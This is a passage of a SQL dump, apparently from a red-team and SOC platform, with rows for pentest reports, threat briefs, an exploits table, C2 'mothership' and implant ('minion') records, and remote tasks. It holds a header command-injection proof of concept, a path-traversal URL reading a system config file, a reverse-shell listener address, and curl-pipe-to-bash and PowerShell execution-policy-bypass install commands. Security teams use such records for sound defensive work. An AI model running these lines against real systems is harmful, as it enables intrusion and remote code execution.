(7, '1CZq6XCbf_aSbmkCfHLioCD', 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', 'Annual Internal Infrastructure Pentest - Q1 2026', 'Offensive Security Team', '<div class=\'container-fluid\'><div class=\'row mb-4\'><div class=\'col-md-4\'><div class=\'card shadow border-0 bg-danger text-white\'><div class=\'card-body text-center\'><p class=\'small text-white-50 mb-1\'>Overall Risk Rating</p><h3 class=\'mb-0\'>Critical</h3></div></div></div><div class=\'col-md-4\'><div class=\'card shadow border-0\'><div class=\'card-body text-center\'><p class=\'small text-muted mb-1\'>Total Findings</p><h3 class=\'mb-0\'>24</h3></div></div></div><div class=\'col-md-4\'><div class=\'card shadow border-0\'><div class=\'card-body text-center\'><p class=\'small text-muted mb-1\'>Domain Admin Pwnage</p><h3 class=\'mb-0 text-success\'>Verified</h3></div></div></div></div><div class=\'card shadow mb-4\'><div class=\'card-header\'><strong class=\'card-title text-uppercase\'>Executive Overview</strong></div><div class=\'card-body\'><p class=\'lead\'>The Q1 Pentest successfully demonstrated a full domain compromise starting from a low-privileged guest network account.</p><p>Key vulnerability chains included <strong>No-PAC (CVE-2021-42278)</strong> and widespread <strong>Kerberoasting</strong> opportunities due to weak service account passwords.</p><h4 class=\'h6 mt-4\'>Remediation Progress</h4><div class=\'progress rounded mb-3\' style=\'height:14px\'><div class=\'progress-bar bg-danger\' role=\'progressbar\' style=\'width: 30%\'>30% Critical</div><div class=\'progress-bar bg-warning\' role=\'progressbar\' style=\'width: 50%\'>50% High</div></div></div></div></div>', 'Offensive Security', '[\"Pentesting Report\",\"Risk-Assessment\"]', '[4,5]', '[7]', '[\"RedTeam\",\"ActiveDirectory\",\"Kerberoasting\",\"Internal\"]', 0, 0, '2026-04-07 21:09:34', '2026-04-07 21:09:34'),
(8, '1CZq6YMvX_N3EkFLbxUbHeC', 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', 'Threat Briefing: North Korean \'Lazarus Group\' Supply Chain Attacks', 'Threat Intel Unit', '<div class=\'container-fluid\'><div class=\'card shadow border-0 mb-4\'><div class=\'card-body p-5\'><h2 class=\'h3 text-primary mb-4\'>Strategic Threat Intel Briefing</h2><p>Lazarus Group has shifted focus toward exploiting Python package repositories (PyPI) to inject malicious code into financial data processing scripts.</p><h4 class=\'h5 mt-4\'>TTP Analysis (MITRE ATT&CK)</h4><table class=\'table table-striped table-hover\'><thead><tr><th>ID</th><th>Technique</th><th>Description</th></tr></thead><tbody><tr><td>T1195.002</td><td>Supply Chain Compromise</td><td>Poisoning dependencies in <code>requirements.txt</code>.</td></tr><tr><td>T1071.001</td><td>Application Layer Protocol</td><td>Using HTTPS/WS for stealthy C2 communication.</td></tr></tbody></table><h4 class=\'h5 mt-4\'>Operational Impact</h4><p>Targeted organizations reported unauthorized exfiltration of encrypted transaction logs. The malware uses a custom AES implementation to bypass standard entropy-based detection.</p><div class=\'alert alert-info\'><i class=\'fe fe-info mr-2\'></i><strong>Security Note:</strong> All developers are advised to use internal artifact mirrors (JFrog/Nexus) and verify checksums for all third-party libraries.</div></div></div></div>', 'Offensive Security', '[\"Threat-Intel-Brief\",\"Root-Cause-Analysis\"]', '[4,7]', '[]', '[\"APT\",\"Lazarus\",\"SupplyChain\",\"Fin-Sector\"]', 1, 0, '2026-04-07 21:09:50', '2026-04-07 21:34:34'),
(9, '1CZq7QTm9_Hxnm1p7vTBvve', 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', 'Quarterly Security Audit - Q1 2026', 'Asher Brown', '<h1>Executive Summary</h1><p>The internal audit for Q1 2026 has been completed...</p>', 'Audit-Report', '[\"Audit-Report\",\"Internal Controls\"]', '[6,7]', '[3]', '[\"compliance\",\"security-audit\",\"2026\"]', 1, 0, '2026-04-07 21:21:09', '2026-04-07 21:21:09'),
(10, '1CZq7RzxA_3mEJ2Z1aJ4dQ2', 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', 'Quarterly Security Audit 2 - Q1 2026', 'Asher Brown', '<div class=\'container-fluid\'><div class=\'row justify-content-center\'><div class=\'col-12 col-lg-10 col-xl-9\'><div class=\'row align-items-center mb-4\'><div class=\'col\'><h2 class=\'h5 page-title\'><small class=\'text-muted text-uppercase\'>Security Advisory</small><br />#ADV-2026-0403: Critical RCE in Internal Middleware</h2></div><div class=\'col-auto text-right\'><span class=\'badge badge-pill badge-danger mr-3\'>Critical Severity</span><button type=\'button\' class=\'btn btn-secondary btn-sm\'>Export PDF</button><button type=\'button\' class=\'btn btn-primary btn-sm\'>Deploy Patch</button></div></div><div class=\'row mb-4\'><div class=\'col-md-3\'><div class=\'card shadow border-0\'><div class=\'card-body text-center\'><p class=\'small text-muted mb-1\'>CVSS Score</p><h3 class=\'mb-0 text-danger\'>9.8</h3></div></div></div><div class=\'col-md-3\'><div class=\'card shadow border-0\'><div class=\'card-body text-center\'><p class=\'small text-muted mb-1\'>Status</p><h3 class=\'mb-0 text-warning\'>Active</h3></div></div></div><div class=\'col-md-3\'><div class=\'card shadow border-0\'><div class=\'card-body text-center\'><p class=\'small text-muted mb-1\'>Affected Assets</p><h3 class=\'mb-0\'>14</h3></div></div></div><div class=\'col-md-3\'><div class=\'card shadow border-0\'><div class=\'card-body text-center\'><p class=\'small text-muted mb-1\'>Owner</p><h3 class=\'mb-0 text-muted\'>SOC-T2</h3></div></div></div></div><div class=\'card shadow mb-4\'><div class=\'card-header\'><strong class=\'card-title text-uppercase\'>Executive Summary</strong></div><div class=\'card-body p-4\'><p class=\'lead\'>A critical remote code execution vulnerability was identified during the routine audit of the <code>/api/v1/internal-sync</code> endpoint.</p></div></div><div class=\'card shadow mb-4\'><div class=\'card-header\'><strong class=\'card-title\'>Technical Walkthrough & POC</strong></div><div class=\'card-body\'><div class=\'card bg-dark mb-2 w-100\'><div class=\'card-body py-2 px-3\'><code class=\'text-success\'>curl -H \'X-Internal-Header: $(PAYLOAD)\' http://internal.target/api/sync</code></div></div></div></div></div></div></div>', 'Audit-Report', '[\"Audit-Report\",\"Internal Controls\"]', 'null', 'null', 'null', 1, 0, '2026-04-07 21:21:30', '2026-04-22 07:29:17'),
(11, '1CaCh6tRW_UUAaDoiKAdTga', 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', 'Quarterly Security Audit 2 - Q1 2026', 'Asher Brown', '<h1>Executive Summary</h1><p>The internal audit for Q1 2026 has been completed...</p>', 'Audit-Report', '[\"Audit-Report\",\"Internal Controls\"]', '[6,7]', '[3]', '[\"compliance\",\"security-audit\",\"2026\"]', 1, 0, '2026-04-19 06:55:32', '2026-04-19 06:55:32'),
(12, '1CavM1kwF_PYrQJGVC8PrBX', 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', 'AVAILABILITY: Docker Host File System Full - INC-20260423-054D', 'SOC Analyst', '<div class=\'ticket-wrapper\'><div class=\'header\'><div class=\'header-title\'><h1>AVAILABILITY: Docker Host File System Full</h1><span class=\'severity-badge\'>MEDIUM / HIGH</span></div><div class=\'header-meta\'><strong>Incident ID:</strong> INC-20260423-054D<br><strong>Status:</strong> ESCALATED<br><strong>Detected:</strong> 2026-04-23 15:14:36 EAT</div></div><div class=\'section\'><div class=\'bluf\'><strong>BLUF:</strong> The production host <strong>prod-p2m</strong> has reached 100% disk utilization on the <code>/data01</code> partition, causing the <strong>dockerd</strong> service to fail. Immediate cleanup of identified container logs is required to prevent application crashes.</div></div><div class=\'section\'><div class=\'section-title\'>Event Specifications</div><div class=\'data-grid\'><div class=\'data-item\'><span class=\'data-label\'>Host Name</span><span class=\'data-value\'>prod-p2m (10.185.11.64)</span></div><div class=\'data-item\'><span class=\'data-label\'>Wazuh Rule ID</span><span class=\'data-value\'>1007 (Low Disk Space)</span></div><div class=\'data-item\'><span class=\'data-label\'>Process</span><span class=\'data-value\'>dockerd [PID: 1190]</span></div><div class=\'data-item\'><span class=\'data-label\'>Affected Path</span><span class=\'data-value\'>/data01/docker/containers/</span></div></div></div><div class=\'section\'><div class=\'section-title\'>SOC Technical Analysis</div><div class=\'analysis-card\'><strong>Impact Mapping:</strong><br><span class=\'tag\'>Availability: Reliability Loss</span><span class=\'tag\'>Logging: Blind Spot Created</span><span class=\'tag\'>PCI DSS: 10.6.1</span></div><p>Telemetry indicates a <code>\'no space left on device\'</code> error targeting container <code>287a36f1...</code>. Over 26k alerts suggest a rapid log-loop. This creates a \'blind window\' where lateral movement can occur without being recorded.</p></div><div class=\'section\'><div class=\'section-title\'>Response Actions</div><table class=\'action-table\'><tr><th>MSP Applied Actions</th><th>Recommended Client Actions</th></tr><tr><td><strong>Investigation:</strong> Identified container <code>287a36f1...</code> as source.<br><strong>Monitoring:</strong> Escalated heartbeating alerts.</td><td><strong>Remediation:</strong> Truncate log file via <code>truncate -s 0</code>.<br><strong>Hardening:</strong> Implement Docker Log Rotation in <code>daemon.json</code>.</td></tr></table></div><div class=\'section\'><div class=\'section-title\'>Raw Log Evidence</div><pre class=\'raw-log\'><code>{ \'agent\': { \'id\': \'054\', \'name\': \'prod-p2m\' }, \'rule\': { \'id\': \'1007\', \'description\': \'File system full.\' }, \'full_log\': \'...msg=\"Error writing log message\" driver=json-file error=\"no space left on device\"\' }</code></pre></div></div>', 'SOC Escalations', '[\"SOC Escalations\"]', '[17]', '[20]', '[\"Wazuh\",\"Docker\",\"Availability\",\"Incident-Response\"]', 0, 0, '2026-05-11 06:57:03', '2026-05-11 06:57:03');

-- --------------------------------------------------------

--
-- Table structure for table `categories`
--

CREATE TABLE `categories` (
  `id` int(11) NOT NULL,
  `name` varchar(255) NOT NULL,
  `parent_id` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `categories`
--

INSERT INTO `categories` (`id`, `name`, `parent_id`) VALUES
(1, 'Endpoint Security', NULL),
(2, 'Security Advisory', 1),
(3, 'SOP\'s Standard Operating Procedures', 1),
(4, 'Offensive Security', NULL),
(5, 'Exploitation Proofs', 3),
(6, 'Compliance Audits', NULL),
(7, 'Internal Controls', 5),
(8, 'w323', 4),
(17, 'SOC Wazuh Tickets', NULL);

-- --------------------------------------------------------

--
-- Table structure for table `comments`
--

CREATE TABLE `comments` (
  `id` int(11) NOT NULL,
  `comment_uuid` varchar(255) NOT NULL,
  `blog_uuid` varchar(255) NOT NULL,
  `comment` text NOT NULL,
  `commentor` varchar(255) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `comments`
--

INSERT INTO `comments` (`id`, `comment_uuid`, `blog_uuid`, `comment`, `commentor`, `created_at`, `updated_at`) VALUES
(1, '1CZq8Y7jE_aEv1vZFbBHRfU', '1CZq65ZLs_EVeN3RvwGaLHt', 'The remediation steps for finding 1.2 have been verified.', 'Jane Smith', '2026-04-07 21:36:00', '2026-04-07 21:36:00'),
(2, '1CaQEdCUS_HcQzTXb6VYBt8', '1CZq6YMvX_N3EkFLbxUbHeC', 'This is good.', 'Sam Odhis', '2026-04-25 09:15:26', '2026-04-25 09:15:26');

-- --------------------------------------------------------

--
-- Table structure for table `enum_types`
--

CREATE TABLE `enum_types` (
  `id` int(11) NOT NULL,
  `type` varchar(100) NOT NULL,
  `description` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `enum_types`
--

INSERT INTO `enum_types` (`id`, `type`, `description`) VALUES
(1, 'SOP-Wazuh Agent Installation', 'Standard Operating Procedure for deploying Wazuh agents across various OS distributions.'),
(2, 'Soc IR Policy', 'Security Operations Center Incident Response policy defining escalation paths and roles.'),
(3, 'SOC-report', 'Daily, weekly, or monthly operational summary of SOC activities and alert volumes.'),
(4, 'IR-SOP', 'Step-by-step technical instructions for responding to specific cyber incident types.'),
(5, 'Audit-Report', 'Formal record of an internal or external audit regarding compliance and control effectiveness.'),
(6, 'Vulnerability Assesement Report', 'Technical report detailing identified security weaknesses and their associated risk scores.'),
(7, 'Pentesting Report', 'Comprehensive documentation of exploited vulnerabilities and proof-of-concept attacks.'),
(8, 'Bug Bounty Report', 'Documentation of a security vulnerability submitted through an external bug bounty program.'),
(9, 'Threat-Intel-Brief', 'Analysis of emerging threats, TTPs, and indicators of compromise relevant to the organization.'),
(10, 'Risk-Assessment', 'Evaluation of business risks associated with specific assets, vendors, or technologies.'),
(11, 'Disaster-Recovery-Plan', 'Procedures for restoring critical IT functions and data following a catastrophic event.'),
(12, 'Cloud-Security-Architecture', 'Design blueprints and security configurations for cloud-native environments (AWS/Azure/GCP).'),
(13, 'Compliance-Matrix', 'Mapping of organizational controls against regulatory frameworks like SOC2, HIPAA, or ISO 27001.'),
(14, 'Root-Cause-Analysis', 'Deep-dive investigation into the underlying cause of a major security incident or system failure.'),
(15, 'Hardening-Guide', 'Configuration standards for securing operating systems, databases, or network devices.'),
(16, 'Bug Bounty', 'This are bug bounty reports based on the vulnerability found and the exploitations technique/procedure.'),
(17, 'IR Report', 'All IR Reports based on the incident and compromise level'),
(18, 'esrferf', 'ervergfer'),
(19, 'vgfg', 'bvfgbf'),
(20, 'SOC Escalations', 'This are escalation from SOC tools SIEM,GCP or any other ingestions we have.');

-- --------------------------------------------------------

--
-- Table structure for table `events`
--

CREATE TABLE `events` (
  `id` int(11) NOT NULL,
  `event_id` varchar(255) NOT NULL,
  `operating_system` int(11) NOT NULL,
  `handled` tinyint(1) NOT NULL,
  `level` int(11) NOT NULL,
  `data` text NOT NULL,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Table structure for table `exploits`
--

CREATE TABLE `exploits` (
  `exploit_id` varchar(255) NOT NULL,
  `target_id` varchar(100) NOT NULL,
  `lhost` varchar(255) DEFAULT NULL,
  `lport` int(11) DEFAULT NULL,
  `address` varchar(255) DEFAULT NULL,
  `average_severity` int(11) NOT NULL,
  `grouped` tinyint(1) DEFAULT 0,
  `grouped_vulns` text DEFAULT NULL,
  `works` tinyint(1) DEFAULT 0,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `exploits`
--

INSERT INTO `exploits` (`exploit_id`, `target_id`, `lhost`, `lport`, `address`, `average_severity`, `grouped`, `grouped_vulns`, `works`, `created_at`, `updated_at`) VALUES
('1CaB9puJn_LQVbTmvprw27S', '60077e5848038468386282765ccd41b1', '', 0, 'https://finance.internal.corp/api/v1/download', 5, 1, '1Ca7FhJsL_MrcfNbb1L3PiL,1Ca7FizFh_YDAQdF9W32t82', 1, '2026-04-18 11:24:48', '2026-04-18 11:24:48'),
('1CaBDHztF_8meMowJQpRUwa', '60077e5848038468386282765ccd41b1', '10.10.10.5', 4444, 'https://payroll.internal.corp/admin/diagnostics', 5, 1, '1Ca7Fk2Mj_a7pAkvhicNEqQ,1Ca7FknhU_tcBQGAnxwgH9C', 1, '2026-04-18 12:10:16', '2026-04-18 12:10:16'),
('1CaBDKB6g_MNRStHd3KrqrE', '60077e5848038468386282765ccd41b1', '', 0, 'http://dev-proxy.internal/view?page=../../etc/ossec.conf', 4, 0, '1Ca7FiDo1_SUDKCMPV6GrLW', 1, '2026-04-18 12:10:32', '2026-04-18 12:10:32'),
('1CaBDLnNW_Hg4BicVnb5u7L', '60077e5848038468386282765ccd41b1', '', 0, 'http://dev-proxy.internal/view?page=../../etc/ossec.conf', 4, 0, '1Ca7FiDo1_SUDKCMPV6GrLW', 1, '2026-04-18 12:10:53', '2026-04-18 12:10:53');

-- --------------------------------------------------------

--
-- Table structure for table `hashes`
--

CREATE TABLE `hashes` (
  `userid` varchar(255) NOT NULL,
  `hash` varchar(255) NOT NULL,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Table structure for table `ioc`
--

CREATE TABLE `ioc` (
  `ioc_id` int(11) NOT NULL,
  `type` varchar(255) NOT NULL,
  `value` text NOT NULL,
  `source` text NOT NULL,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NULL DEFAULT NULL,
  `virusid` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Table structure for table `minion`
--

CREATE TABLE `minion` (
  `minionid` varchar(255) NOT NULL,
  `name` char(100) DEFAULT NULL,
  `uname` varchar(255) DEFAULT NULL,
  `userid` varchar(255) DEFAULT NULL,
  `groupid` varchar(255) DEFAULT NULL,
  `homedir` varchar(255) DEFAULT NULL,
  `ostype` char(20) NOT NULL,
  `description` text NOT NULL,
  `installed` tinyint(1) NOT NULL,
  `mothershipid` varchar(255) NOT NULL,
  `address` text NOT NULL,
  `motherships` text DEFAULT NULL,
  `tunnel_address` text NOT NULL,
  `tls` tinyint(1) NOT NULL,
  `active` tinyint(1) NOT NULL DEFAULT 1,
  `describers` text DEFAULT NULL,
  `ownerid` varchar(255) NOT NULL,
  `lastseen` varchar(255) NOT NULL,
  `is_dropper` tinyint(1) NOT NULL,
  `generate_command` text NOT NULL,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `minion`
--

INSERT INTO `minion` (`minionid`, `name`, `uname`, `userid`, `groupid`, `homedir`, `ostype`, `description`, `installed`, `mothershipid`, `address`, `motherships`, `tunnel_address`, `tls`, `active`, `describers`, `ownerid`, `lastseen`, `is_dropper`, `generate_command`, `created_at`, `updated_at`) VALUES
('1Ca3ZPGVn_WSshdrPVfzUXp', 'Web-Production-Lnx', 'sam', 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', '1000', '/home/sam', 'linux', 'Primary production agent for sam.', 1, '1Ca3HRrD1_iU2n1ZfNyP5YB', '192.168.10.15', '', 'https://tunnel.odin-internal.com', 1, 1, 'eyJtb3RoZXJzaGlwcyI6W3siYWRkcmVzcyI6IjE5Mi4xNjguMS4xMDAiLCJpZCI6IkFscGhhLUMyIn1dfQ==', '123456', '', 0, 'curl -sL https://odin.io/install | bash', '2026-04-14 11:08:58', '2026-04-14 11:08:58'),
('1Ca3Zuqy2_BXsz3epLQH57D', 'Ghost_Nginx_BD-Updated', 'sam', 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', '1000', '/home/sam', 'linux', 'Primary production agent for sam.', 1, '1Ca3HRrD1_iU2n1ZfNyP5YB', '192.168.10.15', '', 'https://tunnel.odin-internal.com', 1, 1, 'eyJtb3RoZXJzaGlwcyI6W3siYWRkcmVzcyI6IjE5Mi4xNjguMS4xMDAiLCJpZCI6IkFscGhhLUMyIn0seyJhZGRyZXNzIjoiNDQuMjAxLjEyLjU1IiwiaWQiOiJCYWNrdXAtQzIifSx7ImFkZHJlc3MiOiI4LjguOC44IiwiaWQiOiJQZWVyIFQwIFBlZXIgQzIifV19', 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', '', 0, 'curl -sL https://odin.io/install | bash', '2026-04-14 11:15:53', '2026-04-14 12:03:51'),
('1Ca3ZW6vz_vZByVdh4aSHCB', 'Web-Production-Lnx', 'sam', 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', '1000', '/home/sam', 'linux', 'Primary production agent for sam.', 1, '1Ca3HRrD1_iU2n1ZfNyP5YB', '192.168.10.15', '', 'https://tunnel.odin-internal.com', 1, 1, 'eyJtb3RoZXJzaGlwcyI6W3siYWRkcmVzcyI6IjE5Mi4xNjguMS4xMDAiLCJpZCI6IkFscGhhLUMyIn1dfQ==', 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', '', 0, 'curl -sL https://odin.io/install | bash', '2026-04-14 11:10:31', '2026-04-14 11:10:31'),
('1Ca3ZYu4x_v7L9To7q1hFub', 'DC-Agent-Win', 'test user', '123456', '513', 'C:\\Users\\testuser', 'windows', 'Domain Controller monitoring agent.', 1, '1Ca3JNY1A_Ev9QMRd8qsJbP', '10.0.0.4', '', 'https://proxy.backup-c2.io', 0, 1, 'eyJtb3RoZXJzaGlwcyI6W3siYWRkcmVzcyI6IjQ1Ljc3Ljg4LjIyIiwiaWQiOiJCZXRhLUMyIn1dfQ==', 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', '', 0, 'powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\init.ps1', '2026-04-14 11:11:09', '2026-04-14 11:11:09');

-- --------------------------------------------------------

--
-- Table structure for table `motherships`
--

CREATE TABLE `motherships` (
  `ownerid` varchar(255) NOT NULL,
  `name` varchar(255) NOT NULL,
  `password` varchar(255) NOT NULL,
  `msid` varchar(255) NOT NULL,
  `address` text NOT NULL,
  `implant_tunnel` text NOT NULL,
  `admin_tunnel` text NOT NULL,
  `other_motherships` text NOT NULL,
  `description` text NOT NULL,
  `tls` tinyint(1) NOT NULL,
  `certpem` text NOT NULL,
  `keypem` text NOT NULL,
  `active` tinyint(1) NOT NULL,
  `generate_command` text NOT NULL,
  `machine_data` text NOT NULL,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `motherships`
--

INSERT INTO `motherships` (`ownerid`, `name`, `password`, `msid`, `address`, `implant_tunnel`, `admin_tunnel`, `other_motherships`, `description`, `tls`, `certpem`, `keypem`, `active`, `generate_command`, `machine_data`, `created_at`, `updated_at`) VALUES
('123456', 'Alpha-C2-Primary-v2', '', '1Ca3HRrD1_iU2n1ZfNyP5YB', '192.168.1.105', 'https://tunnel.alpha.com/implant', 'https://admin.alpha.com/portal', '', 'Primary node updated with failover link to Beta.', 1, '', '', 0, 'curl -sSL https://alpha.com/setup | bash', '{\"username\": \"root\", \"os_type\": \"linux\", \"home_dir\": \"/root\"}', '2026-04-14 07:39:44', '2026-04-14 09:04:33'),
('123456', 'Beta-C2-Backup', '', '1Ca3JNY1A_Ev9QMRd8qsJbP', '45.77.88.22', 'https://backup.beta.io/imp', 'https://backup.beta.io/adm', '', 'Redundant failover node located in US-East.', 0, '', '', 1, 'powershell.exe -ExecutionPolicy Bypass -File install.ps1', '{\"username\": \"Administrator\", \"os_type\": \"windows\", \"home_dir\": \"C:\\Users\\Admin\"}', '2026-04-14 07:52:06', '2026-04-14 07:52:06'),
('ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', '', '', '1CaGnj3bG_Qk9aNFidamAxL', '', '', '', '', '', 0, '', '', 1, '', '', '2026-04-21 10:51:39', '2026-04-21 10:51:39'),
('ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', 'Beta-C2-Backup', '', '1CaGo4eoc_eFFg5tRLuZJT5', '45.77.88.22', 'https://backup.beta.io/imp', 'https://backup.beta.io/adm', '', 'Redundant failover node located in US-East.', 0, '', '', 1, 'powershell.exe -ExecutionPolicy Bypass -File install.ps1', '{\"username\": \"Administrator\", \"os_type\": \"windows\", \"home_dir\": \"C:\\Users\\Admin\"}', '2026-04-21 10:56:05', '2026-04-21 10:56:05'),
('ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', 'Megladon MS', '', '1CaGprZ2W_Es6PrvN5QejFs', '9.9.9.9', 'https://minions.io/tunnel', 'https://admintunnel.io/ms', '', 'Some random test', 1, '', '', 1, 'go build .', '{\"os\":\"linux\"}', '2026-04-21 11:19:34', '2026-04-21 11:19:34'),
('1CaTkgTNy_HJDrzDW7BqEup', 'wwer', '', '1CaTkpVWg_LC6XPQM1R9AhY', '1.1.1.1', 'https://tunnel.io', 'https://tunnel.io/minion', '', '', 1, '', '', 1, 'go build .', '{\"os\": \"linux\", \"arch\": \"amd64\"}', '2026-04-27 05:53:11', '2026-04-27 05:53:11');

-- --------------------------------------------------------

--
-- Table structure for table `plugins`
--

CREATE TABLE `plugins` (
  `owner` varchar(255) NOT NULL,
  `name` varchar(255) NOT NULL,
  `hash` varchar(255) NOT NULL,
  `plugin_type` int(11) NOT NULL,
  `description` text NOT NULL,
  `active` tinyint(1) NOT NULL,
  `signed` tinyint(1) NOT NULL,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Table structure for table `rmm_executions`
--

CREATE TABLE `rmm_executions` (
  `execution_id` varchar(255) NOT NULL,
  `task_id` varchar(255) NOT NULL,
  `minionid` varchar(255) NOT NULL,
  `status` varchar(50) NOT NULL,
  `output` longtext DEFAULT NULL,
  `verification_hash` varchar(255) NOT NULL,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `rmm_executions`
--

INSERT INTO `rmm_executions` (`execution_id`, `task_id`, `minionid`, `status`, `output`, `verification_hash`, `created_at`, `updated_at`) VALUES
('1Ca5S5Exx_CUZJDv1ZgHkp7', '1Ca5RXxVt_DakwqXBpAhD2u', '1Ca3Zuqy2_BXsz3epLQH57D', 'success', 'wazuh-agent.service - Wazuh agent\n   Loaded: loaded\n   Active: active (running) since Wed 2026-04-15 13:10:05 EAT', 'MD5_OF_TASKID_AND_MINIONID', '2026-04-15 10:54:17', '2026-04-15 10:54:17');

-- --------------------------------------------------------

--
-- Table structure for table `rmm_tasks`
--

CREATE TABLE `rmm_tasks` (
  `task_id` varchar(255) NOT NULL,
  `ownerid` varchar(255) NOT NULL,
  `command` text NOT NULL,
  `target_type` varchar(50) NOT NULL,
  `minion_ids` text DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `rmm_tasks`
--

INSERT INTO `rmm_tasks` (`task_id`, `ownerid`, `command`, `target_type`, `minion_ids`, `created_at`, `updated_at`) VALUES
('1Ca5RXxVt_DakwqXBpAhD2u', 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', 'systemctl restart wazuh-agent && /var/ossec/bin/wazuh-control status', 'linux', 'WyIxQ2EzWnVxeTJfQlhzejNlcExRSDU3RCIsIjFDYTNIUnJEMV9pVTJuMVpmTnlQNVlCIiwiTG54LURlcHQtU2VydmVyLTA1Il0=', '2026-04-15 10:47:13', '2026-04-15 10:47:13'),
('1Ca5SBLto_VVHqHebTr6qdy', 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', 'apt-get update && apt-get upgrade -y wazuh-agent', 'linux', 'WyIxQ2EzWnVxeTJfQlhzejNlcExRSDU3RCJd', '2026-04-15 10:55:40', '2026-04-15 10:55:58');

-- --------------------------------------------------------

--
-- Table structure for table `scans`
--

CREATE TABLE `scans` (
  `scan_id` varchar(100) NOT NULL,
  `name` varchar(255) NOT NULL,
  `scan_type` enum('Bug Bounty','Pentest','Black Ops') DEFAULT NULL,
  `owner_id` varchar(255) NOT NULL,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `scans`
--

INSERT INTO `scans` (`scan_id`, `name`, `scan_type`, `owner_id`, `created_at`, `updated_at`) VALUES
('044c62d9abbca9bca9a17a865dc01589', 'example_1', 'Bug Bounty', 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', '2025-03-22 02:38:30', '2025-03-22 02:38:30'),
('12cbf5f4922792f5eb72d2972abe8483', 'example_2', 'Bug Bounty', '123456', '2025-02-11 10:01:33', '2025-02-11 10:01:33'),
('58819d63e178f1e8cb46e12f23a15795', 'example_3', 'Pentest', '123456', '2025-02-11 10:00:26', '2025-02-11 10:00:26'),
('67a4a7f7f807673e0a114494ab60e309', 'example_4', 'Pentest', '123456', '2025-03-20 08:52:27', '2025-03-20 08:52:27'),
('b9c7690613a10b0f5e49bc3b13673c17', 'example_5', 'Black Ops', 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', '2025-03-22 02:44:31', '2025-03-22 02:44:31'),
('f9328b7c81720ca278a697a7b8d81f75', 'example_6', 'Black Ops', 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', '2025-03-22 02:37:44', '2025-03-22 02:37:44');

-- --------------------------------------------------------

--
-- Table structure for table `services`
--

CREATE TABLE `services` (
  `service_id` int(11) NOT NULL,
  `target_id` varchar(100) NOT NULL,
  `service_name` varchar(255) NOT NULL,
  `port` int(11) DEFAULT NULL,
  `protocol` varchar(20) NOT NULL,
  `state` tinyint(1) NOT NULL,
  `version` varchar(255) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NULL DEFAULT NULL,
  `data` text DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `services`
--

